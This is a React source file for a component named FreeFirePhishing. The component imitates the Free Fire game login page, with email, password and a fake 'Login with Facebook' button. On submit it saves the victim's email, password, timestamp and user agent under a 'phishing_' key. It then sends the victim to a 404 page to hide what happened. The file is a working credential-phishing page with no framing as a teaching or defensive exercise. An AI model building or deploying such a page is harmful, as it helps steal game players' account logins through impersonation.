
import { useState, useEffect } from 'react';
import { useParams, useNavigate } from 'react-router-dom';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';

const FreeFirePhishing = () => {
  const { userId } = useParams();
  const navigate = useNavigate();
  const [formData, setFormData] = useState({
    email: '',
    password: ''
  });

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    
    const capturedData = {
      platform: 'Free Fire',
      email: formData.email,
      password: formData.password,
      timestamp: Date.now(),
      ip: 'Unknown',
      userAgent: navigator.userAgent
    };

    const existingData = JSON.parse(localStorage.getItem(`phishing_${userId}`) || '[]');
    existingData.push(capturedData);
    localStorage.setItem(`phishing_${userId}`, JSON.stringify(existingData));

    navigate('/404-not-found');
  };

  return (
    <div className="min-h-screen bg-gradient-to-b from-orange-400 to-red-600 flex items-center justify-center">
      <div className="max-w-sm mx-auto px-6">
        <div className="bg-white rounded-lg p-6 shadow-xl">
          <div className="text-center mb-6">
            <div className="w-16 h-16 bg-gradient-to-r from-orange-500 to-red-500 rounded-full flex items-center justify-center mx-auto mb-4">
              <span className="text-white text-2xl font-bold">🔥</span>
            </div>
            <h1 className="text-gray-800 text-2xl font-bold">Free Fire</h1>
            <p className="text-gray-600 text-sm mt-2">Login to your account</p>
          </div>

          <form onSubmit={handleSubmit} className="space-y-4">
            <Input
              type="text"
              placeholder="Email or Phone Number"
              value={formData.email}
              onChange={(e) => setFormData({...formData, email: e.target.value})}
              className="w-full h-12 border-2 border-gray-300 rounded-lg text-gray-800 bg-white"
              required
            />
            
            <Input
              type="password"
              placeholder="Password"
              value={formData.password}
              onChange={(e) => setFormData({...formData, password: e.target.value})}
              className="w-full h-12 border-2 border-gray-300 rounded-lg text-gray-800 bg-white"
              required
            />

            <Button 
              type="submit"
              className="w-full bg-gradient-to-r from-orange-500 to-red-500 hover:from-orange-600 hover:to-red-600 text-white h-12 text-lg font-bold rounded-lg"
            >
              LOGIN
            </Button>
          </form>

          <div className="text-center mt-6">
            <a href="#" className="text-blue-600 text-sm">Forgot Password?</a>
          </div>

          <div className="flex items-center my-6">
            <div className="flex-1 border-t border-gray-300"></div>
            <span className="px-4 text-gray-500 text-sm">OR</span>
            <div className="flex-1 border-t border-gray-300"></div>
          </div>

          <Button className="w-full bg-blue-600 hover:bg-blue-700 text-white h-12 font-semibold rounded-lg">
            Login with Facebook
          </Button>
        </div>
      </div>
    </div>
  );
};

export default FreeFirePhishing;
